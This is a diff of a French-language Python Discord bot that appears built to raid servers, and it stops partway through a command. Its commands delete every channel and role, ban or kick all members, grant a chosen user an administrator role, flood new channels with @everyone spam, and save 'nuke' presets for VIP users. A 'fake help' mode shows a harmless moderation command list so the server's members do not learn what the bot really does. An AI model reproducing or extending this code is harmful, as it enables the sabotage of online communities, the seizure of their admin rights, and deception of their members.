-        if not r.is_default() and not r.managed and r < me.top_role
-    ]
-    role_tasks = [_safe(r.delete(reason='/reset')) for r in role_targets]
-
-    await asyncio.gather(*chan_tasks, *role_tasks)
-
-    # 3) Creer le salon _terminal
-    terminal = await _safe(guild.create_text_channel(name='_terminal', reason='/reset terminal'))
-
-    elapsed = asyncio.get_event_loop().time() - start
-    remaining_roles = {r.id for r in guild.roles}
-    deleted_roles = sum(1 for r in role_targets if r.id not in remaining_roles)
-
-    if terminal:
-        try:
-            await terminal.send(
-                f'**/reset termine en {elapsed:.1f}s** - {deleted_roles}/{len(role_targets)} roles supprimes. '
-                f'Salon `_terminal` cree.'
-            )
-        except Exception:
-            pass
-    await interaction.followup.send(
-        f'Reset complet en {elapsed:.1f}s. Salon `_terminal` cree.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /ban-all & /kick-all ----------------------------- #
-
-@bot.tree.command(name='ban-all', description='Bannit tous les membres du serveur')
-@require_auth()
-async def ban_all(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.ban_members:
-        await interaction.followup.send('Le bot doit avoir Ban Members / Administrateur.', ephemeral=True)
-        return
-
-    targets = [
-        m for m in guild.members
-        if not m.bot and m.id != interaction.user.id and m.id != guild.owner_id and m.top_role < me.top_role
-    ]
-    start = asyncio.get_event_loop().time()
-    await asyncio.gather(*[_safe(m.ban(reason=f'/ban-all by {interaction.user}', delete_message_days=0)) for m in targets])
-    elapsed = asyncio.get_event_loop().time() - start
-
-    # compte : ceux qui ne sont plus dans la guilde
-    remaining_ids = {m.id for m in guild.members}
-    banned = sum(1 for m in targets if m.id not in remaining_ids)
-    await interaction.followup.send(
-        f'**{banned}/{len(targets)}** membres bannis en {elapsed:.1f}s.',
-        ephemeral=True,
-    )
-
-
-@bot.tree.command(name='kick-all', description='Expulse tous les membres du serveur')
-@require_auth()
-async def kick_all(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.kick_members:
-        await interaction.followup.send('Le bot doit avoir Kick Members / Administrateur.', ephemeral=True)
-        return
-
-    targets = [
-        m for m in guild.members
-        if not m.bot and m.id != interaction.user.id and m.id != guild.owner_id and m.top_role < me.top_role
-    ]
-    start = asyncio.get_event_loop().time()
-    await asyncio.gather(*[_safe(m.kick(reason=f'/kick-all by {interaction.user}')) for m in targets])
-    elapsed = asyncio.get_event_loop().time() - start
-
-    remaining_ids = {m.id for m in guild.members}
-    kicked = sum(1 for m in targets if m.id not in remaining_ids)
-    await interaction.followup.send(
-        f'**{kicked}/{len(targets)}** membres expulses en {elapsed:.1f}s.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /rename-s ----------------------------- #
-
-@bot.tree.command(name='rename-s', description='Renomme le serveur')
-@app_commands.describe(name='Nouveau nom du serveur (2 a 100 caracteres)')
-@require_auth()
-async def rename_s(interaction: discord.Interaction, name: str):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.manage_guild:
-        await interaction.followup.send('Le bot doit avoir Manage Server / Administrateur.', ephemeral=True)
-        return
-
-    new_name = name.strip()
-    if len(new_name) < 2 or len(new_name) > 100:
-        await interaction.followup.send('Le nom doit faire entre 2 et 100 caracteres.', ephemeral=True)
-        return
-
-    old_name = guild.name
-    try:
-        await guild.edit(name=new_name, reason=f'/rename-s by {interaction.user}')
-    except discord.HTTPException as e:
-        await interaction.followup.send(f'Erreur Discord: `{e}`', ephemeral=True)
-        return
-
-    await interaction.followup.send(
-        f'Serveur renomme: **{old_name}** -> **{new_name}**',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /supp-roles ----------------------------- #
-
-@bot.tree.command(name='supp-roles', description='Supprime tous les roles (all) ou un role precis par son ID')
-@app_commands.describe(target='"all" pour tout supprimer, ou l ID d un role specifique (defaut: all)')
-@require_auth()
-async def supp_roles(interaction: discord.Interaction, target: str = 'all'):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.manage_roles:
-        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
-        return
-
-    target = target.strip().lower()
-
-    if target != 'all':
-        try:
-            rid = int(target)
-        except ValueError:
-            await interaction.followup.send('target doit etre "all" ou un ID numerique.', ephemeral=True)
-            return
-        role = guild.get_role(rid)
-        if role is None:
-            await interaction.followup.send(f'Aucun role avec l ID `{rid}`.', ephemeral=True)
-            return
-        if role.is_default() or role.managed or role >= me.top_role:
-            await interaction.followup.send('Role non supprimable (everyone, integration, ou hierarchie).', ephemeral=True)
-            return
-        await role.delete(reason=f'/supp-roles by {interaction.user}')
-        await interaction.followup.send(f'Role **{role.name}** supprime.', ephemeral=True)
-        return
-
-    deletable = [
-        r for r in guild.roles
-        if not r.is_default() and not r.managed and r < me.top_role
-    ]
-    if not deletable:
-        await interaction.followup.send('Aucun role supprimable trouve.', ephemeral=True)
-        return
-
-    start = asyncio.get_event_loop().time()
-    await asyncio.gather(*[_safe(r.delete(reason='/supp-roles all')) for r in deletable])
-    remaining = {r.id for r in guild.roles}
-    deleted_count = sum(1 for r in deletable if r.id not in remaining)
-    elapsed = asyncio.get_event_loop().time() - start
-    await interaction.followup.send(
-        f'**{deleted_count}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /help & /fakehelp ----------------------------- #
-
-def _build_real_help_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title='Commandes du bot',
-        description='Liste des commandes reellement disponibles.',
-        color=0x5865F2,
-    )
-    embed.add_field(name='Admin / Roles', value=(
-        '`/giveadmin <user_id>` - Cree un role Admin (tout en haut) et l attribue\n'
-        '`/spam-r <role_name> [count=5]` - Cree count roles nommes role_name-1, role_name-2, ...\n'
-        '`/supp-roles [all|role_id]` - Supprime tous les roles ou un role precis'
-    ), inline=False)
-    embed.add_field(name='Salons / Messages', value=(
-        '`/n-salon <number> <message> [repeat=5] [name=spam]` - Supprime tout, recree N salons, spam\n'
-        '`/rename-s <name>` - Renomme le serveur'
-    ), inline=False)
-    embed.add_field(name='Destruction', value=(
-        '`/nuke [channels=50] [message] [repeat=5] [channel_name] [server_name] [delete_roles] [spam_role_name] [spam_role_count=50]` - Nuke complet\n'
-        '`/reset` - Supprime TOUT et cree un salon `_terminal`\n'
-        '`/ban-all` - Ban tous les membres\n'
-        '`/kick-all` - Kick tous les membres'
-    ), inline=False)
-    embed.add_field(name='Presets VIP', value=(
-        '`/n-config` - Menu interactif pour creer/lister/supprimer des presets /nuke (VIP)\n'
-        '`/p-run <preset_name>` - Execute /nuke avec un preset sauvegarde (VIP)'
-    ), inline=False)
-    embed.add_field(name='Help', value=(
-        '`/help` - Affiche ce message\n'
-        '`/fakehelp` - Bascule `/help` en mode "faux help" (commandes fictives)\n'
-        '`/fake-help <salon>` - Envoie un faux embed d aide dans un salon'
-        ), inline=False)
-    embed.set_footer(text='Acces reserve aux membres du serveur principal datahub')
-    return embed
-
-
-def _build_fake_help_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title='Liste des commandes',
-        description='Voici les commandes disponibles sur ce serveur.',
-        color=0x5865F2,
-    )
-    embed.add_field(name='Moderation', value=(
-        '`/ban` - Bannir un utilisateur\n'
-        '`/kick` - Expulser un utilisateur\n'
-        '`/mute` - Rendre muet un utilisateur\n'
-        '`/unmute` - Retirer le mute\n'
-        '`/warn` - Avertir un utilisateur\n'
-        '`/clear` - Supprimer des messages'
-    ), inline=False)
-    embed.add_field(name='Utilitaires', value=(
-        '`/userinfo` - Infos sur un utilisateur\n'
-        '`/serverinfo` - Infos sur le serveur\n'
-        '`/avatar` - Afficher l avatar\n'
-        '`/ping` - Latence du bot'
-    ), inline=False)
-    embed.add_field(name='Roles', value=(
-        '`/role-add` - Ajouter un role\n'
-        '`/role-remove` - Retirer un role\n'
-        '`/role-list` - Liste des roles'
-    ), inline=False)
-    embed.add_field(name='Fun', value=(
-        '`/say` - Faire parler le bot\n'
-        '`/poll` - Creer un sondage\n'
-        '`/8ball` - Boule magique\n'
-        '`/coinflip` - Pile ou face'
-    ), inline=False)
-    embed.set_footer(text='Tape une commande pour l utiliser')
-    return embed
-
-
-@bot.tree.command(name='help', description='Affiche la liste des commandes')
-async def help_cmd(interaction: discord.Interaction):
-    # /help est public : pas de check d autorisation (pour que le faux help trompe tout le monde)
-    gid = interaction.guild.id if interaction.guild else 0
-    if fake_help_mode.get(gid, False):
-        embed = _build_fake_help_embed()
-    else:
-        embed = _build_real_help_embed()
-    await interaction.response.send_message(embed=embed, ephemeral=False)
-
-
-@bot.tree.command(name='fakehelp', description='Bascule /help en mode "faux help" (commandes fictives)')
-@app_commands.describe(enabled='true = active le faux help, false = revient au vrai help (defaut: toggle)')
-@require_auth()
-async def fakehelp_cmd(interaction: discord.Interaction, enabled: bool = None):
-    if interaction.guild is None:
-        await interaction.response.send_message('A utiliser dans un serveur.', ephemeral=True)
-        return
-    gid = interaction.guild.id
-    current = fake_help_mode.get(gid, False)
-    new_state = (not current) if enabled is None else bool(enabled)
-    fake_help_mode[gid] = new_state
-    status = 'ACTIF (faux help)' if new_state else 'DESACTIVE (vrai help)'
-    await interaction.response.send_message(
-        f'Mode fake-help : **{status}**. `/help` affichera maintenant {"les fausses" if new_state else "les vraies"} commandes.',
-        ephemeral=True,
-    )
-
-
-# ----------------------------- /fake-help (envoi direct dans un salon) ----------------------------- #
-
-@bot.tree.command(name='fake-help', description='Envoie un embed help (faux) dans le salon choisi')
-@app_commands.describe(salon='Salon ou envoyer l embed')
-@require_auth()
-async def fake_help(interaction: discord.Interaction, salon: discord.TextChannel):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    me = interaction.guild.me
-    perms = salon.permissions_for(me) if me else None
-    if not perms or not perms.send_messages or not perms.embed_links:
-        await interaction.followup.send(f'Le bot ne peut pas envoyer d embed dans {salon.mention}.', ephemeral=True)
-        return
-
-    await salon.send(embed=_build_fake_help_embed())
-    await interaction.followup.send(f'Embed envoye dans {salon.mention}.', ephemeral=True)
-
-
-# ----------------------------- /n-config (VIP) ----------------------------- #
 
 def _truthy(s: str) -> bool:
     return s.strip().lower() in ('1', 'true', 'yes', 'y', 'oui', 'o', 'vrai')
@@ -896,12 +554,103 @@ def _truthy(s: str) -> bool:
 
 def _preset_summary(p: dict) -> str:
     return (
-        f"channels=`{p.get('channels', 50)}` repeat=`{p.get('repeat', 5)}` "
-        f"channel_name=`{p.get('channel_name', 'nuked')}` message=`{p.get('message', '@everyone')[:30]}`\n"
-        f"server_name=`{p.get('server_name') or '-'}` delete_roles=`{p.get('delete_roles', True)}` "
-        f"spam_role_name=`{p.get('spam_role_name', 'nuked')}` spam_role_count=`{p.get('spam_role_count', 50)}`"
+        f\"channels=`{p.get('channels', 50)}` repeat=`{p.get('repeat', 5)}` \"
+        f\"channel_name=`{p.get('channel_name', 'nuked')}` message=`{(p.get('message', '@everyone') or '')[:30]}`
+\"
+        f\"server_name=`{p.get('server_name') or '-'}` delete_roles=`{p.get('delete_roles', True)}` \"
+        f\"spam_role_name=`{p.get('spam_role_name', 'nuked')}` spam_role_count=`{p.get('spam_role_count', 50)}`\"
     )
 
+
+# --------------------------------------------------------------------------- #
+# Help / Fake help embeds
+# --------------------------------------------------------------------------- #
+
+def _build_real_help_embed() -> discord.Embed:
+    p = CHILD_PREFIX
+    embed = _embed('Commandes du bot', 'Liste des commandes reellement disponibles.', EMBED_COLOR)
+    embed.add_field(name='Admin / Roles', value=(
+        f'`{p}giveadmin <user_id>` - Cree un role Admin (tout en haut) et l attribue
+'
+        f'`{p}spam-r <role_name> [count=5]` - Cree count roles
+'
+        f'`{p}supp-roles [all|role_id]` - Supprime tous les roles ou un role precis'
+    ), inline=False)
+    embed.add_field(name='Salons / Messages', value=(
+        f'`{p}n-salon <number> <message...>` - Supprime tout, recree N salons, spam
+'
+        f'`{p}rename-s <name>` - Renomme le serveur'
+    ), inline=False)
+    embed.add_field(name='Destruction', value=(
+        f'`{p}nuke [channels=50] [message...=@everyone]` - Nuke complet
+'
+        f'`{p}reset` - Supprime TOUT et cree un salon `_terminal`
+'
+        f'`{p}ban-all` - Ban tous les membres
+'
+        f'`{p}kick-all` - Kick tous les membres'
+    ), inline=False)
+    embed.add_field(name='Presets VIP', value=(
+        f'`{p}n-config` - Menu interactif (presets) - VIP
+'
+        f'`{p}p-run <preset_name>` - Lance /nuke avec un preset - VIP'
+    ), inline=False)
+    embed.add_field(name='Help', value=(
+        f'`{p}help` - Affiche ce message
+'
+        f'`{p}fakehelp [true|false]` - Bascule `{p}help` en mode \"faux help\"
+'
+        f'`{p}fake-help <#salon>` - Envoie un faux embed d aide dans un salon'
+    ), inline=False)
+    return embed
+
+
+def _build_fake_help_embed() -> discord.Embed:
+    embed = _embed('Liste des commandes', 'Voici les commandes disponibles sur ce serveur.', EMBED_COLOR)
+    embed.add_field(name='Moderation', value=(
+        '`/ban` - Bannir un utilisateur
+'
+        '`/kick` - Expulser un utilisateur
+'
+        '`/mute` - Rendre muet un utilisateur
+'
+        '`/unmute` - Retirer le mute
+'
+        '`/warn` - Avertir un utilisateur
+'
+        '`/clear` - Supprimer des messages'
+    ), inline=False)
+    embed.add_field(name='Utilitaires', value=(
+        '`/userinfo` - Infos sur un utilisateur
+'
+        '`/serverinfo` - Infos sur le serveur
+'
+        '`/avatar` - Afficher l avatar
+'
+        '`/ping` - Latence du bot'
+    ), inline=False)
+    embed.add_field(name='Roles', value=(
+        '`/role-add` - Ajouter un role
+'
+        '`/role-remove` - Retirer un role
+'
+        '`/role-list` - Liste des roles'
+    ), inline=False)
+    embed.add_field(name='Fun', value=(
+        '`/say` - Faire parler le bot
+'
+        '`/poll` - Creer un sondage
+'
+        '`/8ball` - Boule magique
+'
+        '`/coinflip` - Pile ou face'
+    ), inline=False)
+    return embed
+
+
+# --------------------------------------------------------------------------- #
+# Preset UI (modals + views) - used by +n-config
+# --------------------------------------------------------------------------- #
 
 class PresetBaseModal(discord.ui.Modal, title='Nouveau preset - infos de base'):
     def __init__(self, user_id: int):
@@ -922,13 +671,17 @@ class PresetBaseModal(discord.ui.Modal, title='Nouveau preset - infos de base'):
             ch = max(1, min(500, int(str(self.channels))))
             rp = max(1, min(50, int(str(self.repeat))))
         except ValueError:
-            await interaction.response.send_message('channels/repeat doivent etre des nombres.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Erreur', 'channels/repeat doivent etre des nombres.', EMBED_COLOR_BAD),
+                ephemeral=True,
+            )
             return
         name = str(self.preset_name).strip()
         if not name:
-            await interaction.response.send_message('Nom de preset requis.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Erreur', 'Nom de preset requis.', EMBED_COLOR_BAD), ephemeral=True,
+            )
             return
-
         preset = {
             'channels': ch,
             'message': str(self.message),
@@ -940,18 +693,8 @@ class PresetBaseModal(discord.ui.Modal, title='Nouveau preset - infos de base'):
             'spam_role_count': 50,
         }
         _set_user_preset(self.user_id, name, preset)
-
-        embed = discord.Embed(
-            title=f'Preset `{name}` sauvegarde',
-            description=_preset_summary(preset),
-            color=0x43B581,
-        )
-        embed.set_footer(text='Tu peux configurer les options avancees (optionnel).')
-        await interaction.response.send_message(
-            embed=embed,
-            view=AdvancedView(self.user_id, name),
-            ephemeral=True,
-        )
+        embed = _embed(f'Preset `{name}` sauvegarde', _preset_summary(preset), EMBED_COLOR_OK)
+        await interaction.response.send_message(embed=embed, view=AdvancedView(self.user_id, name), ephemeral=True)
 
 
 class PresetAdvancedModal(discord.ui.Modal, title='Options avancees du preset'):
@@ -973,13 +716,17 @@ class PresetAdvancedModal(discord.ui.Modal, title='Options avancees du preset'):
         try:
             src = max(0, min(250, int(str(self.spam_role_count))))
         except ValueError:
-            await interaction.response.send_message('spam_role_count doit etre un nombre.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Erreur', 'spam_role_count doit etre un nombre.', EMBED_COLOR_BAD),
+                ephemeral=True,
+            )
             return
-
         presets = _get_user_presets(self.user_id)
         preset = presets.get(self.preset_name)
         if preset is None:
-            await interaction.response.send_message('Preset introuvable.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Erreur', 'Preset introuvable.', EMBED_COLOR_BAD), ephemeral=True,
+            )
             return
         sn = str(self.server_name).strip()
         preset['server_name'] = sn if sn else None
@@ -987,12 +734,7 @@ class PresetAdvancedModal(discord.ui.Modal, title='Options avancees du preset'):
         preset['spam_role_name'] = str(self.spam_role_name).strip() or 'nuked'
         preset['spam_role_count'] = src
         _set_user_preset(self.user_id, self.preset_name, preset)
-
-        embed = discord.Embed(
-            title=f'Preset `{self.preset_name}` mis a jour',
-            description=_preset_summary(preset),
-            color=0x43B581,
-        )
+        embed = _embed(f'Preset `{self.preset_name}` mis a jour', _preset_summary(preset), EMBED_COLOR_OK)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
@@ -1002,8 +744,8 @@ class AdvancedView(discord.ui.View):
         self.user_id = user_id
         self.preset_name = preset_name
 
-    @discord.ui.button(label='Options avancees', style=discord.ButtonStyle.primary, emoji='\N{GEAR}')
-    async def advanced(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label='Options avancees', style=discord.ButtonStyle.primary)
+    async def advanced(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
         if interaction.user.id != self.user_id:
             await interaction.response.send_message('Pas pour toi.', ephemeral=True)
             return
@@ -1014,7 +756,7 @@ class AdvancedView(discord.ui.View):
 class PresetSelect(discord.ui.Select):
     def __init__(self, user_id: int, action: str, presets: dict):
         self.user_id = user_id
-        self.action = action  # 'view' or 'delete'
+        self.action = action
         options = [
             discord.SelectOption(label=name[:100], description=_preset_summary(p)[:100])
             for name, p in list(presets.items())[:25]
@@ -1029,18 +771,19 @@ class PresetSelect(discord.ui.Select):
         if self.action == 'delete':
             ok = _del_user_preset(self.user_id, name)
             msg = f'Preset `{name}` supprime.' if ok else f'Preset `{name}` introuvable.'
-            await interaction.response.send_message(msg, ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Suppression', msg, EMBED_COLOR_OK if ok else EMBED_COLOR_BAD),
+                ephemeral=True,
+            )
         else:
             preset = _get_user_presets(self.user_id).get(name)
             if preset is None:
-                await interaction.response.send_message('Preset introuvable.', ephemeral=True)
+                await interaction.response.send_message(
+                    embed=_embed('Erreur', 'Preset introuvable.', EMBED_COLOR_BAD), ephemeral=True,
+                )
                 return
-            embed = discord.Embed(
-                title=f'Preset `{name}`',
-                description=_preset_summary(preset),
-                color=0x5865F2,
-            )
-            embed.set_footer(text=f'Lance avec: /p-run {name}')
+            embed = _embed(f'Preset `{name}`', _preset_summary(preset), EMBED_COLOR)
+            embed.add_field(name='Lancer', value=f'`{CHILD_PREFIX}p-run {name}`', inline=False)
             await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
@@ -1049,108 +792,411 @@ class NConfigView(discord.ui.View):
         super().__init__(timeout=300)
         self.user_id = user_id
 
-    @discord.ui.button(label='Nouveau preset', style=discord.ButtonStyle.success, emoji='\N{HEAVY PLUS SIGN}')
-    async def new_preset(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label='Nouveau preset', style=discord.ButtonStyle.success)
+    async def new_preset(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
         if interaction.user.id != self.user_id:
             await interaction.response.send_message('Pas pour toi.', ephemeral=True)
             return
         await interaction.response.send_modal(PresetBaseModal(self.user_id))
 
-    @discord.ui.button(label='Lister mes presets', style=discord.ButtonStyle.primary, emoji='\N{CLIPBOARD}')
-    async def list_presets(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label='Lister mes presets', style=discord.ButtonStyle.primary)
+    async def list_presets(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
         if interaction.user.id != self.user_id:
             await interaction.response.send_message('Pas pour toi.', ephemeral=True)
             return
         presets = _get_user_presets(self.user_id)
         if not presets:
-            await interaction.response.send_message('Tu n as aucun preset.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Aucun preset', 'Tu n as aucun preset.', EMBED_COLOR_BAD), ephemeral=True,
+            )
             return
         view = discord.ui.View(timeout=180)
         view.add_item(PresetSelect(self.user_id, 'view', presets))
-        lines = '\n'.join(f'- `{n}` -> {_preset_summary(p).splitlines()[0]}' for n, p in presets.items())
+        lines = '
+'.join(f'- `{n}` -> {_preset_summary(p).splitlines()[0]}' for n, p in presets.items())
         await interaction.response.send_message(
-            f'**Tes presets ({len(presets)})**\n{lines}',
+            embed=_embed(f'Tes presets ({len(presets)})', lines, EMBED_COLOR),
             view=view, ephemeral=True,
         )
 
-    @discord.ui.button(label='Supprimer un preset', style=discord.ButtonStyle.danger, emoji='\N{WASTEBASKET}')
-    async def del_preset(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label='Supprimer un preset', style=discord.ButtonStyle.danger)
+    async def del_preset(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
         if interaction.user.id != self.user_id:
             await interaction.response.send_message('Pas pour toi.', ephemeral=True)
             return
         presets = _get_user_presets(self.user_id)
         if not presets:
-            await interaction.response.send_message('Tu n as aucun preset.', ephemeral=True)
+            await interaction.response.send_message(
+                embed=_embed('Aucun preset', 'Tu n as aucun preset.', EMBED_COLOR_BAD), ephemeral=True,
+            )
             return
         view = discord.ui.View(timeout=180)
         view.add_item(PresetSelect(self.user_id, 'delete', presets))
-        await interaction.response.send_message('Choisis le preset a supprimer :', view=view, ephemeral=True)
+        await interaction.response.send_message(
+            embed=_embed('Suppression', 'Choisis le preset a supprimer :', EMBED_COLOR),
+            view=view, ephemeral=True,
+        )
 
 
-@bot.tree.command(name='n-config', description='Configurer des presets pour /nuke (VIP uniquement)')
-@require_vip()
-async def n_config(interaction: discord.Interaction):
-    presets = _get_user_presets(interaction.user.id)
-    embed = discord.Embed(
-        title='Configuration de tes presets /nuke',
-        description=(
-            f'Tu as actuellement **{len(presets)}** preset(s) sauvegarde(s).\n\n'
-            f'Utilise les boutons ci-dessous pour creer, lister ou supprimer.\n'
-            f'Execute ensuite avec `/p-run <preset_name>`.'
-        ),
-        color=0x5865F2,
-    )
-    embed.set_footer(text='VIP - DataHub')
-    await interaction.response.send_message(
-        embed=embed, view=NConfigView(interaction.user.id), ephemeral=True,
-    )
+# --------------------------------------------------------------------------- #
+# Child bot commands registration
+# --------------------------------------------------------------------------- #
+
+def _register_child_commands(bot: commands.Bot) -> None:
+
+    @bot.command(name='help')
+    async def help_cmd(ctx: commands.Context):
+        gid = ctx.guild.id if ctx.guild else 0
+        if bot._fake_help_mode.get(gid, False):  # type: ignore[attr-defined]
+            await ctx.send(embed=_build_fake_help_embed())
+        else:
+            await ctx.send(embed=_build_real_help_embed())
+
+    @bot.command(name='fakehelp')
+    @require_auth()
+    async def fakehelp_cmd(ctx: commands.Context, enabled: str | None = None):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        gid = ctx.guild.id
+        current = bot._fake_help_mode.get(gid, False)  # type: ignore[attr-defined]
+        new_state = (not current) if enabled is None else _truthy(enabled)
+        bot._fake_help_mode[gid] = new_state  # type: ignore[attr-defined]
+        status = 'ACTIF (faux help)' if new_state else 'DESACTIVE (vrai help)'
+        await ctx.send(embed=_embed('Mode fake-help', f'**{status}**', EMBED_COLOR_OK))
+
+    @bot.command(name='fake-help')
+    @require_auth()
+    async def fake_help_cmd(ctx: commands.Context, salon: discord.TextChannel):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        me = ctx.guild.me
+        perms = salon.permissions_for(me) if me else None
+        if not perms or not perms.send_messages or not perms.embed_links:
+            await ctx.send(embed=_embed('Erreur', f'Le bot ne peut pas envoyer d embed dans {salon.mention}.', EMBED_COLOR_BAD))
+            return
+        await salon.send(embed=_build_fake_help_embed())
+        await ctx.send(embed=_embed('OK', f'Embed envoye dans {salon.mention}.', EMBED_COLOR_OK))
+
+    @bot.command(name='giveadmin')
+    @require_auth()
+    async def giveadmin(ctx: commands.Context, user_id: str):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        try:
+            uid = int(user_id.strip())
+        except ValueError:
+            await ctx.send(embed=_embed('Erreur', 'ID invalide.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        member = guild.get_member(uid) or await guild.fetch_member(uid)
+        me = guild.me
+        if me is None or not me.guild_permissions.manage_roles:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles / Administrateur.', EMBED_COLOR_BAD))
+            return
+        bot_role = await _move_bot_role_to_top(guild) or me.top_role
+        role = await guild.create_role(
+            name=ROLE_NAME,
+            permissions=discord.Permissions(administrator=True),
+            reason=f'+giveadmin by {ctx.author}',
+        )
+        try:
+            target_pos = max((bot_role.position - 1) if bot_role else 1, 1)
+            await role.edit(position=target_pos, reason='Place giveadmin role tout en haut')
+        except discord.HTTPException as e:
+            log.warning('reposition role: %s', e)
+        await member.add_roles(role, reason=f'+giveadmin by {ctx.author}')
+        await ctx.send(embed=_embed(
+            'Role attribue', f'Role **{role.name}** (Admin) attribue a <@{member.id}>.', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='n-salon')
+    @require_auth()
+    async def n_salon(ctx: commands.Context, number: int, *, message: str = '@everyone'):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.administrator:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
+            return
+        if number < 1 or number > 500:
+            await ctx.send(embed=_embed('Erreur', 'number doit etre entre 1 et 500.', EMBED_COLOR_BAD))
+            return
+        repeat = 5
+        name = 'spam'
+        start = asyncio.get_event_loop().time()
+        await asyncio.gather(*[_safe(c.delete(reason='+n-salon')) for c in list(guild.channels)])
+        create_tasks = [
+            _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='+n-salon'))
+            for i in range(number)
+        ]
+        created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
+
+        async def flood(channel):
+            sent = 0
+            for _ in range(repeat):
+                try:
+                    await channel.send(content=message)
+                    sent += 1
+                except discord.HTTPException as e:
+                    log.warning('send fail: %s', e)
+                    await asyncio.sleep(0.5)
+            return sent
+
+        results = await asyncio.gather(*[flood(c) for c in created])
+        total = sum(results)
+        elapsed = asyncio.get_event_loop().time() - start
+        if created:
+            try:
+                await created[0].send(embed=_embed(
+                    'n-salon', f'Termine en {elapsed:.1f}s - {len(created)}/{number} salons, {total} messages.',
+                    EMBED_COLOR_OK,
+                ))
+            except Exception:  # noqa: BLE001
+                pass
+
+    @bot.command(name='spam-r')
+    @require_auth()
+    async def spam_r(ctx: commands.Context, role_name: str, count: int = 5):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        me = ctx.guild.me
+        if me is None or not me.guild_permissions.manage_roles:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles.', EMBED_COLOR_BAD))
+            return
+        if count < 1 or count > 250:
+            await ctx.send(embed=_embed('Erreur', 'count doit etre entre 1 et 250.', EMBED_COLOR_BAD))
+            return
+        base = role_name.strip()[:90] or 'role'
+        start = asyncio.get_event_loop().time()
+        created = await _spam_roles(ctx.guild, base, count, reason=f'+spam-r by {ctx.author}')
+        elapsed = asyncio.get_event_loop().time() - start
+        await ctx.send(embed=_embed(
+            'spam-r', f'**{created}/{count}** roles `{base}-N` crees en {elapsed:.1f}s.', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='nuke')
+    @require_auth()
+    async def nuke(ctx: commands.Context, channels: int = 50, *, message: str = '@everyone'):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        me = ctx.guild.me
+        if me is None or not me.guild_permissions.administrator:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
+            return
+        if channels < 1 or channels > 500:
+            await ctx.send(embed=_embed('Erreur', 'channels doit etre entre 1 et 500.', EMBED_COLOR_BAD))
+            return
+        await _execute_nuke(
+            ctx.guild, ctx.author,
+            channels=channels, message=message, repeat=5,
+            channel_name='nuked', server_name=None, delete_roles=True,
+            spam_role_name='nuked', spam_role_count=50,
+        )
+
+    @bot.command(name='reset')
+    @require_auth()
+    async def reset_cmd(ctx: commands.Context):
+        if ctx.guild is None:
